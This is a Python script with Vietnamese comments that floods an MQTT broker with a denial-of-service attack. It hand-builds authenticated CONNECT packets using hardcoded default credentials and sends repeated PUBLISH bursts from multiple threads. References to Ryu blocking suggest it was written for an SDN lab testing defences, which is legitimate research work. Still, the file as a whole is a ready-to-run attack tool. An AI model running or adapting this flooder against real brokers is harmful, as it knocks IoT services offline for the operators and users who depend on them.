#!/usr/bin/env python3
"""
Attack — MQTT DoS Flood
========================
Gửi liên tục CONNECT + PUBLISH packet đến broker để gây quá tải.
Tự build MQTT CONNECT packet có username/password để vượt qua authentication.

Chạy:
    python3 attack_dos.py --target 10.0.0.10 --rate 1000 --threads 5
    python3 attack_dos.py --target 10.0.0.10 --rate 1000 --threads 5 --user mqttadmin --password Xk9mP2vL
"""

import argparse
import time
import socket
import threading
import logging
import random
import sys

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(threadName)s] %(levelname)s — %(message)s"
)
log = logging.getLogger("DoSAttack")

# ── Thống kê toàn cục ─────────────────────────────────────────────────────────
stats_lock   = threading.Lock()
total_sent   = 0
total_errors = 0
total_blocked = 0
stop_event   = threading.Event()


def build_connect_packet(username: str, password: str, client_id: str = "dos") -> bytes:
    """
    Tự build MQTT CONNECT packet (v3.1.1) có username + password.
    Broker bật allow_anonymous=false sẽ trả CONNACK rc=0 thay vì rc=5.
    """
    def encode_str(s: str) -> bytes:
        b = s.encode("utf-8")
        return len(b).to_bytes(2, "big") + b

    protocol_name  = encode_str("MQTT")
    protocol_level = b'\x04'       # v3.1.1
    # Connect flags: username(1) + password(1) + clean_session(1) = 0xC2
    connect_flags  = b'\xC2'
    keepalive      = (60).to_bytes(2, "big")

    payload         = encode_str(client_id) + encode_str(username) + encode_str(password)
    variable_header = protocol_name + protocol_level + connect_flags + keepalive
    remaining       = variable_header + payload

    fixed_header    = b'\x10' + len(remaining).to_bytes(1, "big")
    return fixed_header + remaining


def mqtt_flood(target_ip: str, target_port: int, rate: int,
               thread_id: int, username: str, password: str):
    """
    Mỗi vòng: mở TCP → CONNECT (có auth) → bắn 50 PUBLISH → đóng.
    Lặp vô tận cho đến khi stop_event được set (Ctrl+C).
    """
    global total_sent, total_errors, total_blocked

    # Gói PUBLISH QoS 0 — topic "test/topic", payload "spam1234"
    publish_pkt = b'\x30\x12\x00\x0atest/topicspam1234'
    delay       = 1.0 / rate if rate > 0 else 0
    client_id   = f"dos-{thread_id}-{random.randint(1000, 9999)}"

    while not stop_event.is_set():
        try:
            connect_pkt = build_connect_packet(username, password, client_id)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.send(connect_pkt)

            # Đọc CONNACK
            try:
                connack = s.recv(4)
                if len(connack) >= 4 and connack[3] != 0:
                    # rc != 0 → broker từ chối (credentials sai hoặc bị Ryu block)
                    s.close()
                    with stats_lock:
                        total_blocked += 1
                    time.sleep(0.05)
                    continue
            except socket.timeout:
                pass

            # Bắn liên tục các gói PUBLISH để gây lụt
            local_sent = 0
            for _ in range(50):
                if stop_event.is_set():
                    break
                s.send(publish_pkt)
                local_sent += 1
                if delay > 0:
                    time.sleep(delay)

            s.close()

            with stats_lock:
                total_sent += local_sent

        except ConnectionRefusedError:
            # Broker không lắng nghe hoặc Ryu đã block port
            with stats_lock:
                total_blocked += 1
            time.sleep(0.1)
        except Exception:
            with stats_lock:
                total_errors += 1


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MQTT DoS/Flood Attacker (với authentication)")
    parser.add_argument("--target",   required=True,         help="IP của MQTT Broker")
    parser.add_argument("--port",     type=int, default=1883, help="Port broker")
    parser.add_argument("--rate",     type=int, default=1000, help="Số gói tin / giây trên mỗi luồng")
    parser.add_argument("--threads",  type=int, default=5,    help="Số lượng luồng tấn công")
    parser.add_argument("--user",     default="mqttadmin",    help="MQTT username")
    parser.add_argument("--password", default="Xk9mP2vL",     help="MQTT password")
    args = parser.parse_args()

    print("\n" + "=" * 60)
    print("  💥 MQTT DoS FLOOD ATTACK")
    print(f"  🎯 Target   : {args.target}:{args.port}")
    print(f"  🧵 Threads  : {args.threads}")
    print(f"  ⚡ Rate     : {args.rate} pkt/s per thread")
    print(f"  🔑 Auth     : {args.user} / {args.password}")
    print("=" * 60)
    log.info(f"Đang khởi chạy DoS Flood tới {args.target}:{args.port} với {args.threads} threads...")

    start_time = time.time()
    threads = []

    for i in range(args.threads):
        t = threading.Thread(
            target=mqtt_flood,
            args=(args.target, args.port, args.rate, i, args.user, args.password),
            name=f"DoS-{i}",
            daemon=True,
        )
        threads.append(t)
        t.start()

    try:
        while True:
            time.sleep(1)
            elapsed = time.time() - start_time
            with stats_lock:
                s, e, b = total_sent, total_errors, total_blocked
            rate_actual = s / elapsed if elapsed > 0 else 0
            log.info(f"sent={s:,}  errors={e}  blocked={b}  rate={rate_actual:.1f} pkt/s")
    except KeyboardInterrupt:
        stop_event.set()
        elapsed = time.time() - start_time
        print("\n" + "=" * 60)
        print("  📊 KẾT QUẢ TẤN CÔNG")
        print(f"  ⏱️  Thời gian    : {elapsed:.2f}s")
        print(f"  📤 Tổng gửi     : {total_sent:,}")
        print(f"  ❌ Lỗi          : {total_errors:,}")
        print(f"  🚫 Bị chặn      : {total_blocked:,}")
        if elapsed > 0 and total_sent > 0:
            print(f"  ⚡ Tốc độ TB    : {total_sent / elapsed:,.1f} pkt/s")
        print("=" * 60)
        print("[*] Dừng tấn công.")
        sys.exit(0)
